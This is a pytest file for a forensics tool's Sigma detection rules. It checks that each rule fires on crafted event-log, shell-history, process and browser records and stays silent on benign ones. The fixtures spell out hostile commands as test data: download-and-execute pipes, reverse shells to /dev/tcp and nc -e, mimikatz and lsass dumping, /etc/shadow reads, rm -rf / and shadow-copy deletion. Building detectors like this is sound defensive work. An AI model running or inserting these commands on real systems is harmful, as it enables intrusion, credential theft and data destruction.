"""The rules Nik ships (``backend/app/sigma/pack/*.yml``) run by the real engine: each must be supported and,
for a record that it is meant for, match; for a record it is not meant for, stay silent.

The folder is the backend's: it is found in a checkout (``backend/app/sigma/pack``), at ``NIK_SIGMA_PACK``, or at
``/opt/nik-forensics/pack`` (where a CI step that runs the tests in the image mounts it); without it every test here
is skipped and says why. Every record is made here: harmless text, never evidence.
"""

from __future__ import annotations

import os
import uuid
from datetime import datetime
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest
import yaml
from nik_forensics.sigma import check
from nik_forensics.sigma.engine import Engine
from sigma_support import SYSMON, record

HERE = Path(__file__).resolve()
LEVELS = {"informational": 1, "low": 2, "medium": 3, "high": 4, "critical": 5}


def _folder() -> Path | None:
    wanted = [
        os.environ.get("NIK_SIGMA_PACK", ""),
        str(HERE.parents[3] / "backend/app/sigma/pack"),
        "/opt/nik-forensics/pack",
    ]
    for item in wanted:
        if item and Path(item).is_dir() and any(Path(item).glob("*.yml")):
            return Path(item)
    return None


FOLDER = _folder()
pytestmark = pytest.mark.skipif(
    FOLDER is None,
    reason="the rules of the Nik pack (backend/app/sigma/pack) are not here: mount the folder and set NIK_SIGMA_PACK",
)


def _texts() -> dict[str, str]:
    if FOLDER is None:
        return {}
    return {path.stem: path.read_text(encoding="utf-8") for path in sorted(FOLDER.glob("*.yml"))}


TEXTS = _texts()


def line_of(text: str) -> dict:
    """The rule line of the wire contract for the text of a file."""
    document = yaml.safe_load(text)
    place = document.get("logsource") or {}
    return {
        "id": document["id"],
        "title": document["title"],
        "level": LEVELS[document["level"]],
        "kind": "correlation" if "correlation" in document else "rule",
        "product": place.get("product", ""),
        "category": place.get("category", ""),
        "service": place.get("service", ""),
        "source": text,
    }


def hits(stems: list[str], records: list[tuple], hours: dict | None = None) -> tuple[dict[str, int], list[dict]]:
    """How many records matched each rule (by stem of the first one named), and the detections of correlations."""
    engine = Engine([line_of(TEXTS[stem]) for stem in stems], hours)
    by_id = {line_of(TEXTS[stem])["id"]: stem for stem in stems}
    found: dict[str, int] = {}
    for one in records:
        for rule_id in engine.see(*one):
            found[by_id[rule_id]] = found.get(by_id[rule_id], 0) + 1
    detections, _notes = engine.finish()
    return found, detections


# --------------------------------------------------------------------------- #
# The records                                                                  #
# --------------------------------------------------------------------------- #
def event(channel: str, event_id: int, **data) -> tuple:
    return record(data, channel=channel, event_id=event_id, kind="eventlog")


def command(text: str) -> tuple:
    return record({"command": text, "shell": "bash"}, channel="", event_id=None, kind="commands", source="bash")


def artifact(**data) -> tuple:
    return record({"category": "execution", "os": "windows", **data}, channel="", event_id=None, kind="endpoint")


def page(**data) -> tuple:
    return record(data, channel="", event_id=None, kind="browser", source="chrome.history")


SYSTEM, SECURITY = "System", "Security"
PS_OP = "Microsoft-Windows-PowerShell/Operational"
PS_CLASSIC = "Windows PowerShell"
TASKS = "Microsoft-Windows-TaskScheduler/Operational"
DEFENDER = "Microsoft-Windows-Windows Defender/Operational"
RDP_SESSION = "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
RDP_CONNECTION = "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational"
USER_EXE = "C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe"

# stem -> (records that must match, records that must not)
SINGLE: dict[str, tuple[list[tuple], list[tuple]]] = {
    "windows-security-log-cleared": ([event(SECURITY, 1102)], [event(SECURITY, 4624), event(SYSTEM, 1102)]),
    "windows-system-log-cleared": (
        [event(SYSTEM, 104, provider="Microsoft-Windows-Eventlog")],
        [
            event(SECURITY, 104, provider="Microsoft-Windows-Eventlog"),
            event(SYSTEM, 104, provider="Disk"),
            event(SYSTEM, 7045),
        ],
    ),
    "windows-service-installed": (
        [event(SYSTEM, 7045, provider="Service Control Manager", ServiceName="x")],
        [
            event(SYSTEM, 7036, provider="Service Control Manager"),
            event(SECURITY, 7045, provider="Service Control Manager"),
            event(SYSTEM, 7045),
        ],
    ),
    "windows-audit-policy-changed": ([event(SECURITY, 4719)], [event(SECURITY, 4720), event(SYSTEM, 4719)]),
    "windows-service-installed-user-path": (
        [
            event(SYSTEM, 7045, ImagePath=USER_EXE),
            event(SECURITY, 4697, ServiceFileName="C:\\ProgramData\\evil\\svc.exe"),
            event(SYSTEM, 7045, ImagePath="cmd.exe /c copy x y"),
            event(SYSTEM, 7045, ImagePath="%COMSPEC% /c start"),
            event(SYSTEM, 7045, ImagePath="C:\\Windows\\System32\\POWERSHELL.exe -nop"),
        ],
        [
            event(SYSTEM, 7045, ImagePath="C:\\Program Files\\Vendor\\svc.exe"),
            event(SYSTEM, 7045, ImagePath="C:\\ProgramData\\Microsoft\\Windows Defender\\svc.exe"),
            event(SYSTEM, 7036, ImagePath=USER_EXE),
            event(SECURITY, 4697, ServiceFileName="C:\\Windows\\System32\\svchost.exe -k netsvcs"),
        ],
    ),
    "windows-powershell-suspicious-script": (
        [
            event(PS_OP, 4104, ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x/a')"),
            event(PS_OP, 4104, ScriptBlockText="powershell -enc " + "QUJD" * 8),
            event(PS_OP, 4104, ScriptBlockText="powershell -w hidden -c calc"),
            event(PS_OP, 4103, Payload="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"),
            event(PS_OP, 4104, ScriptBlockText="iwr http://x/y -OutFile z"),
        ],
        [
            event(PS_OP, 4104, ScriptBlockText="Get-ChildItem C:\\Temp | Sort-Object Length"),
            event(PS_OP, 4104, ScriptBlockText="Write-Host 'a diet of kiwi'"),
            event(PS_OP, 4104, ScriptBlockText="powershell -e short"),
            event(SECURITY, 4688, ScriptBlockText="Invoke-Expression"),
        ],
    ),
    "windows-powershell-classic-suspicious": (
        [
            event(PS_CLASSIC, 400, Data3="NewEngineState=Available\nHostApplication=powershell -enc " + "QUJD" * 8),
            event(PS_CLASSIC, 800, Data1='CommandInvocation(Invoke-Expression): "Invoke-Expression"'),
            event(PS_CLASSIC, 800, Data2="powershell -WindowStyle Hidden -file x.ps1"),
        ],
        [
            event(PS_CLASSIC, 400, Data3="HostApplication=powershell.exe"),
            event(PS_CLASSIC, 800, Data1="CommandInvocation(Get-Date)"),
            event(PS_OP, 400, Data3="Invoke-Expression"),
        ],
    ),
    "windows-account-created": (
        [event(SECURITY, 4720, TargetUserName="bob"), event(SECURITY, 4722, TargetUserName="bob")],
        [event(SECURITY, 4726, TargetUserName="bob"), event(SYSTEM, 4720)],
    ),
    "windows-added-to-privileged-group": (
        [
            event(SECURITY, 4732, TargetUserName="Administrators", TargetSid="S-1-5-32-544"),
            event(SECURITY, 4728, TargetUserName="Domain Admins", TargetSid="S-1-5-21-1-2-3-512"),
            event(SECURITY, 4756, TargetUserName="Remote Desktop Users"),
            event(SECURITY, 4732, TargetUserName="Group1", TargetSid="S-1-5-32-551"),
            event(SECURITY, 4728, TargetUserName="Operators of Enterprise", TargetSid="S-1-5-21-1-2-3-519"),
        ],
        [
            event(SECURITY, 4732, TargetUserName="Printer Users", TargetSid="S-1-5-32-550"),
            event(SECURITY, 4728, TargetUserName="Sales", TargetSid="S-1-5-21-1-2-3-1105"),
            event(SECURITY, 4729, TargetUserName="Administrators", TargetSid="S-1-5-32-544"),
        ],
    ),
    "windows-defender-detection-or-disabled": (
        [event(DEFENDER, 1116), event(DEFENDER, 1117), event(DEFENDER, 5001)],
        [event(DEFENDER, 1000), event(SYSTEM, 1116)],
    ),
    "windows-scheduled-task-created": (
        [event(SECURITY, 4698, TaskName="\\x"), event(TASKS, 106, TaskName="\\x")],
        [event(SECURITY, 4699, TaskName="\\x"), event(TASKS, 140), event(SYSTEM, 106)],
    ),
    # --- command histories ------------------------------------------------------------------------------------
    "nik-command-download-exec": (
        [command("curl -s http://x/y.sh | bash"), command("wget -qO- http://x | sh"), command("iwr http://x | iex")],
        [command("curl -O http://x/y.tar.gz"), command("ls | grep sh")],
    ),
    "nik-command-encoded-payload": (
        [
            command("echo QUJD | base64 -d"),
            command("powershell -EncodedCommand AAAA"),
            command("certutil -f -decode a b"),
        ],
        [command("base64 file.txt"), command("echo hello")],
    ),
    "nik-command-reverse-shell": (
        [command("nc -lvp 4444 -e /bin/sh"), command("bash -i >& /dev/tcp/10.0.0.1/80 0>&1"), command("mkfifo /tmp/f")],
        [command("nc -zv host 22"), command("echo tcp")],
    ),
    "nik-command-history-tampering": (
        [command("history -c"), command("unset HISTFILE"), command("export HISTSIZE=0"), command("rm ~/.bash_history")],
        [command("history | tail"), command("cat ~/.bash_history")],
    ),
    "nik-command-credential-access": (
        [command("cat /etc/shadow"), command("./mimikatz.exe"), command("procdump -ma lsass.exe x.dmp")],
        [command("cat /etc/passwd"), command("ls")],
    ),
    "nik-command-defense-evasion": (
        [
            command("Set-MpPreference -DisableRealtimeMonitoring $true"),
            command("setenforce 0"),
            command("systemctl stop auditd"),
            command("auditctl -e 0"),
        ],
        [command("setenforce 1"), command("systemctl status auditd")],
    ),
    "nik-command-privilege-escalation": (
        [command("sudo su -"), command("chmod +s /bin/bash"), command("chmod 4755 x"), command("pkexec bash")],
        [command("sudo ls"), command("chmod 644 x")],
    ),
    "nik-command-persistence": (
        [
            command("crontab -e"),
            command("echo k >> ~/.ssh/authorized_keys"),
            command("systemctl enable evil"),
            command("schtasks /create /tn x"),
            command("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x"),
        ],
        [command("crontab"), command("systemctl status x")],
    ),
    "nik-command-recon": (
        [
            command("nmap -sV 10.0.0.0/24"),
            command("whoami /priv"),
            command('net group "Domain Admins" /domain'),
            command("smbclient -L host"),
        ],
        [command("snmap x"), command("whoami")],
    ),
    "nik-command-exfiltration": (
        [
            command("rclone copy /data remote:"),
            command("curl -T file http://x"),
            command("tar cz /data | ssh h 'cat > x'"),
            command("scp file user@host:/tmp"),
        ],
        [command("scp file host:/tmp"), command("curl http://x")],
    ),
    "nik-command-destructive": (
        [
            command("rm -rf /"),
            command("rm -rf ~"),
            command("mkfs.ext4 /dev/sda1"),
            command("dd if=/dev/zero of=/dev/sda"),
            command("vssadmin delete shadows /all"),
        ],
        [command("rm -rf /tmp/build"), command("dd if=a of=b")],
    ),
    # --- endpoint artifacts -------------------------------------------------------------------------------------
    "nik-endpoint-runs-from-temp": (
        [
            artifact(path="C:\\Users\\a\\AppData\\Local\\Temp\\x.exe"),
            artifact(command="/tmp/run.sh"),
            artifact(target="/dev/shm/x"),
            artifact(path="C:\\Windows\\Temp\\setup.PS1"),
        ],
        [
            artifact(path="C:\\Program Files\\App\\app.exe"),
            artifact(path="C:\\Temp\\notes.txt"),
            artifact(name="tmp.exe"),
        ],
    ),
    "nik-endpoint-runs-from-user-path": (
        [
            artifact(path="C:\\Users\\a\\Downloads\\setup.exe"),
            artifact(path="/home/a/Downloads/x.sh"),
            artifact(command="C:\\Users\\bob\\Desktop\\run.SCR"),
        ],
        [
            artifact(path="C:\\Program Files\\App\\app.exe"),
            artifact(path="C:\\Users\\a\\Downloads\\notes.txt"),
            artifact(path="C:\\Users\\bob\\AppData\\Local\\Programs\\app\\app.exe"),
        ],
    ),
    "nik-endpoint-lolbin": (
        [
            artifact(name="MSHTA.EXE"),
            artifact(path="C:\\Windows\\System32\\rundll32.exe"),
            artifact(command="certutil.exe -urlcache"),
        ],
        [artifact(name="notmshta.dll"), artifact(path="C:\\Windows\\System32\\cmd.exe")],
    ),
    "nik-endpoint-double-extension": (
        [artifact(name="invoice.pdf.exe"), artifact(path="C:\\x\\photo.jpg .scr"), artifact(target="a.TXT.bat")],
        [artifact(name="report.pdf"), artifact(name="setup.exe"), artifact(name="archive.exe.txt")],
    ),
    "nik-endpoint-persistence-location": (
        [
            artifact(location="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            artifact(path="C:\\Windows\\System32\\Tasks\\x"),
            artifact(command="/etc/cron.d/x"),
            artifact(name="evil.service"),
            artifact(path="~/.ssh/authorized_keys"),
        ],
        [artifact(name="services.msc"), artifact(path="C:\\Program Files\\App\\app.exe")],
    ),
    "nik-endpoint-suspicious-name": (
        [
            artifact(name="mimikatz.exe"),
            artifact(path="C:\\x\\PsExec.exe"),
            artifact(name="svch0st.exe"),
            artifact(name="nc.exe"),
        ],
        [artifact(name="svchost.exe"), artifact(name="beaconing.txt"), artifact(name="ncurses.dll")],
    ),
    # --- browser ------------------------------------------------------------------------------------------------
    "nik-browser-pastebin": ([page(url="https://pastebin.com/abc")], [page(url="https://example.com/paste")]),
    "nik-browser-mega-nz": ([page(url="https://mega.nz/file/x")], [page(url="https://megaanz.example/x")]),
    "nik-browser-onion": (
        [page(url="http://abcdef.onion/"), page(title="The dark web guide"), page(url="https://x.example/darkweb")],
        [page(url="https://example.com/onions")],
    ),
    "nik-browser-exploit": (
        [page(url="https://www.exploit-db.com/x"), page(title="An Exploit for X")],
        [page(url="https://example.com")],
    ),
    "nik-browser-bypass": ([page(title="UAC bypass methods")], [page(url="https://example.com")]),
    "nik-browser-tor": (
        [page(url="https://www.torproject.org/"), page(title="Download Tor Browser"), page(url="http://x/tor/start")],
        [page(url="https://example.com/tutorial"), page(title="A history of Torino")],
    ),
    "nik-browser-malware": (
        [page(title="Ransomware report"), page(url="https://x/malware")],
        [page(url="https://example.com")],
    ),
    "nik-browser-cracking": (
        [
            page(title="Crack for photo editor"),
            page(url="https://x/keygen"),
            page(fileName="WAREZ.zip"),
            page(title="cracking passwords"),
        ],
        [page(title="Cracker barrel"), page(url="https://example.com/crackle")],
    ),
    "nik-browser-anonymous-sharing": (
        [
            page(url="https://anonfiles.com/x"),
            page(url="https://transfer.sh/x"),
            page(url="https://temp-mail.org"),
            page(url="https://gofile.io/d/x"),
            page(title="Temp Mail"),
        ],
        [page(url="https://example.com/transfer"), page(url="https://gofile.example/x")],
    ),
}


# --- process command lines: the same patterns as the command histories, read on the processes of the event log ---
CMD = "C:\\Windows\\System32\\cmd.exe"
PWSH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
# stem -> (image, a command line that must match, one that must not)
PROCESS: dict[str, tuple[str, str, str]] = {
    "windows-process-credential-access": (CMD, "mimikatz.exe sekurlsa::logonpasswords", "notepad.exe a.txt"),
    "windows-process-defense-evasion": (
        PWSH,
        "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
        "powershell Get-MpPreference",
    ),
    "windows-process-destructive": (CMD, "vssadmin delete shadows /all /quiet", "vssadmin list shadows"),
    "windows-process-download-exec": (
        PWSH,
        "powershell iwr http://x/y | iex",
        "powershell iwr http://x/y -OutFile y.zip",
    ),
    "windows-process-encoded-payload": (PWSH, "powershell -EncodedCommand AAAA", "powershell -File a.ps1"),
    "windows-process-exfiltration": (CMD, "rclone copy C:\\data remote:bucket", "robocopy C:\\a C:\\b"),
    "windows-process-persistence": (CMD, "schtasks /create /tn x /tr a.exe", "reg query HKCU\\Software\\Run"),
    "windows-process-recon": (CMD, "nmap -sV 10.0.0.0/24", "snmap x"),
    "windows-process-reverse-shell": (CMD, "nc.exe 10.0.0.1 4444 -e cmd.exe", "nc -zv host 22"),
    "windows-process-powershell-suspicious": (
        PWSH,
        "powershell -nop -w hidden -c calc",
        "powershell Get-ChildItem C:\\Temp",
    ),
}


def process_records(image: str, line: str) -> list[tuple]:
    """The same process as Sysmon says it (event 1) and as the Security log says it (4688)."""
    return [
        record({"Image": image, "CommandLine": line}, channel=SYSMON, event_id=1),
        record(
            {"NewProcessName": image, "CommandLine": line, "SubjectUserName": "alice"}, channel=SECURITY, event_id=4688
        ),
    ]


def at(stamp: str, zone: str = "UTC") -> int:
    return int(datetime.fromisoformat(stamp).replace(tzinfo=ZoneInfo(zone)).timestamp() * 1000)


def logon(event_id: int, user: str, stamp: str, key: str, **data) -> tuple:
    return record(
        {"TargetUserName": user, **data}, channel=SECURITY, event_id=event_id, key=key, ts=at(stamp), host="DC1"
    )


# --------------------------------------------------------------------------- #
# The tests                                                                    #
# --------------------------------------------------------------------------- #
def test_the_pack_is_the_fifty_three_rules_and_each_has_a_case():
    shipped = {name for name in TEXTS}
    cases = (
        set(SINGLE)
        | {
            "windows-failed-logon",
            "windows-successful-logon",
            "windows-brute-force-logons",
            "windows-logon-after-failures",
            "windows-repeated-failed-logons",
            "windows-rdp-logon-off-hours",
        }
        | set(PROCESS)
    )
    assert len(shipped) == 53
    assert shipped == cases, f"no case for {sorted(shipped - cases)}, a case for no file: {sorted(cases - shipped)}"


@pytest.mark.parametrize("stem", sorted(TEXTS))
def test_a_rule_of_the_pack_is_a_supported_one_that_says_who_made_it(stem):
    document = yaml.safe_load(TEXTS[stem])
    assert str(uuid.UUID(document["id"])) == document["id"]
    assert document["author"] == "Nik" and document["status"] in ("stable", "test") and document["level"] in LEVELS
    assert document["description"].strip()
    answer = check.check([{"source": TEXTS[stem]}])["documents"][0]
    assert answer["errors"] == []
    (info,) = answer["rules"]
    assert info["supported"], info["reason"]
    assert info["id"] == document["id"] and info["level"] == LEVELS[document["level"]]


def test_the_ids_of_the_rules_are_all_different_and_the_ones_shipped_before_did_not_change():
    ids = [yaml.safe_load(text)["id"] for text in TEXTS.values()]
    assert len(set(ids)) == len(ids)
    assert yaml.safe_load(TEXTS["windows-security-log-cleared"])["id"] == "1c1753aa-4b5c-473b-8f60-7fc16b99154c"
    assert yaml.safe_load(TEXTS["windows-system-log-cleared"])["id"] == "d05e39f7-ccaa-44af-83a3-c4430fb08b6b"
    assert yaml.safe_load(TEXTS["windows-service-installed"])["id"] == "2536e357-3978-4225-ba66-172a250f99e1"


@pytest.mark.parametrize("stem", sorted(SINGLE))
def test_a_rule_matches_the_records_it_is_for_and_not_the_others(stem):
    must, must_not = SINGLE[stem]
    assert must and must_not
    for number, one in enumerate(must):
        found, _ = hits([stem], [one])
        assert found == {stem: 1}, f"record {number} of {one[9]} should match"
    for number, one in enumerate(must_not):
        found, _ = hits([stem], [one])
        assert found == {}, f"record {number} of {one[9]} should not match"


def test_the_failed_and_the_successful_logon_are_the_bases_of_the_correlations():
    failed = logon(4625, "alice", "2026-05-05 10:00:00", "f1")
    ok = logon(4624, "alice", "2026-05-05 10:00:01", "o1")
    assert hits(["windows-failed-logon"], [failed, ok])[0] == {"windows-failed-logon": 1}
    assert hits(["windows-successful-logon"], [failed, ok])[0] == {"windows-successful-logon": 1}
    # Named by a correlation that does not generate, a base rule says nothing by itself.
    everything = [
        "windows-failed-logon",
        "windows-successful-logon",
        "windows-brute-force-logons",
        "windows-repeated-failed-logons",
        "windows-logon-after-failures",
    ]
    assert hits(everything, [failed, ok])[0] == {}


def test_brute_force_is_ten_failed_logons_of_one_account_in_ten_minutes():
    stems = ["windows-failed-logon", "windows-brute-force-logons"]
    ten = [logon(4625, "alice", f"2026-05-05 10:0{n}:00", f"f{n}") for n in range(10)]
    _, found = hits(stems, ten)
    assert [(d["key"], d["count"]) for d in found] == [("f9", 10)] and len(found[0]["records"]) == 10
    assert hits(stems, ten[:9])[1] == []
    slow = [logon(4625, "alice", f"2026-05-05 10:{n * 2:02d}:00", f"s{n}") for n in range(10)]  # 18 minutes
    assert hits(stems, slow)[1] == []
    mixed = [logon(4625, "alice" if n % 2 else "bob", f"2026-05-05 10:0{n}:00", f"m{n}") for n in range(10)]
    assert hits(stems, mixed)[1] == []


LOGON_STEMS = [
    "windows-failed-logon",
    "windows-successful-logon",
    "windows-repeated-failed-logons",
    "windows-logon-after-failures",
]


def failures(user: str, count: int, first_minute: int = 0, prefix: str = "f") -> list[tuple]:
    return [logon(4625, user, f"2026-05-05 10:{first_minute + n:02d}:00", f"{prefix}{n}") for n in range(count)]


def test_five_failed_logons_in_half_an_hour_are_the_first_step_alone():
    stems = ["windows-failed-logon", "windows-repeated-failed-logons"]
    assert hits(stems, failures("alice", 4))[1] == []
    (found,) = hits(stems, failures("alice", 5))[1]
    assert found["rule"] == line_of(TEXTS[stems[1]])["id"] and (found["key"], found["count"]) == ("f4", 5)
    assert hits(stems, failures("alice", 5, prefix="a") + failures("bob", 4, prefix="b"))[1][0]["key"] == "a4"
    spread = [logon(4625, "alice", f"2026-05-05 1{n // 2}:{(n % 2) * 40:02d}:00", f"s{n}") for n in range(5)]
    assert hits(stems, spread)[1] == [], "forty minutes between two of them is more than the half hour"


def test_a_logon_after_failures_is_five_failures_of_an_account_then_a_success_of_it():
    me = line_of(TEXTS["windows-logon-after-failures"])["id"]
    ok = logon(4624, "alice", "2026-05-05 10:20:00", "o1")
    assert hits(LOGON_STEMS, [*failures("alice", 4), ok])[1] == []
    (found,) = hits(LOGON_STEMS, [*failures("alice", 5), ok])[1]
    assert (found["rule"], found["key"]) == (me, "o1")
    assert found["records"] == ["f0", "f1", "f2", "f3", "f4", "o1"] and found["count"] == 2
    other = logon(4624, "bob", "2026-05-05 10:20:00", "o2")
    assert hits(LOGON_STEMS, [*failures("alice", 5), other])[1] == []
    first = logon(4624, "alice", "2026-05-05 09:50:00", "o3")
    assert hits(LOGON_STEMS, [first, *failures("alice", 5)])[1] == []
    late = logon(4624, "alice", "2026-05-05 10:35:00", "o4")  # more than thirty minutes after the fifth failure
    assert hits(LOGON_STEMS, [*failures("alice", 5), late])[1] == []
    # The correlation it is built on writes nothing of its own while this one works; alone it does.
    assert [d["rule"] for d in hits(LOGON_STEMS[:3], failures("alice", 5))[1]] == [
        line_of(TEXTS["windows-repeated-failed-logons"])["id"]
    ]


def test_the_levels_of_the_logon_rules():
    levels = {stem: yaml.safe_load(TEXTS[stem])["level"] for stem in LOGON_STEMS}
    assert levels == {
        "windows-failed-logon": "informational",
        "windows-successful-logon": "informational",
        "windows-repeated-failed-logons": "low",
        "windows-logon-after-failures": "high",
    }


@pytest.mark.parametrize("stem", sorted(PROCESS))
def test_a_process_rule_reads_the_command_line_of_sysmon_1_and_of_4688(stem):
    image, bad, good = PROCESS[stem]
    for number, one in enumerate(process_records(image, bad)):
        assert hits([stem], [one])[0] == {stem: 1}, f"record {number} should match"
    for number, one in enumerate(process_records(image, good)):
        assert hits([stem], [one])[0] == {}, f"record {number} should not match"
    # The rule is for processes: the same text in a command history is for the rules of the histories.
    assert hits([stem], [command(bad)])[0] == {}


def test_the_powershell_command_line_rule_wants_powershell_as_the_image():
    stem = "windows-process-powershell-suspicious"
    line = "powershell -nop -c iex (New-Object Net.WebClient).DownloadString('http://x')"
    assert hits([stem], process_records(CMD, line))[0] == {}
    assert hits([stem], process_records("C:\\Program Files\\PowerShell\\7\\PWSH.EXE", line))[0] == {stem: 2}


def test_the_process_rules_share_the_tags_and_levels_of_their_command_rules():
    for stem in PROCESS:
        if stem.endswith("powershell-suspicious"):
            continue
        mine = yaml.safe_load(TEXTS[stem])
        theirs = yaml.safe_load(TEXTS["nik-command-" + stem[len("windows-process-") :]])
        assert (mine["level"], mine["tags"]) == (theirs["level"], theirs["tags"])
        assert mine["title"] == theirs["title"].removeprefix("Command: ") + " (process command line)"
        assert mine["logsource"] == {"product": "windows", "category": "process_creation"}


def test_rdp_outside_working_hours_reads_the_hours_of_the_request():
    hours = {"tz": "Europe/Rome", "days": [1, 2, 3, 4, 5], "start": "08:00", "end": "18:00"}

    def rdp(stamp: str, event_id: int = 4624, channel: str = SECURITY, **data) -> tuple:
        return record(data, channel=channel, event_id=event_id, ts=at(stamp, "Europe/Rome"))

    stem = ["windows-rdp-logon-off-hours"]
    night = rdp("2026-05-05 23:00:00", LogonType="10")  # a Tuesday
    noon = rdp("2026-05-05 12:00:00", LogonType="10")
    saturday = rdp("2026-05-09 12:00:00", LogonType="10")
    console = rdp("2026-05-05 23:00:00", LogonType="2")
    assert hits(stem, [night, noon, saturday, console], hours)[0] == {stem[0]: 2}
    session = rdp("2026-05-05 23:30:00", 21, RDP_SESSION, User="CORP\\alice")
    connection = rdp("2026-05-05 06:59:00", 1149, RDP_CONNECTION)
    assert hits(stem, [session, connection], hours)[0] == {stem[0]: 2}
    assert (
        hits(stem, [rdp("2026-05-05 12:30:00", 21, RDP_SESSION), rdp("2026-05-05 23:30:00", 24, RDP_SESSION)], hours)[0]
        == {}
    )
    # The same instant is out of hours in Rome and at work in New York, so the zone is the one given.
    new_york = {**hours, "tz": "America/New_York"}
    late = rdp("2026-05-05 23:00:00", LogonType="10")  # 17:00 in New York
    assert hits(stem, [late], hours)[0] == {stem[0]: 1} and hits(stem, [late], new_york)[0] == {}
    # Without hours no record has the field: nothing matches.
    assert hits(stem, [night])[0] == {}
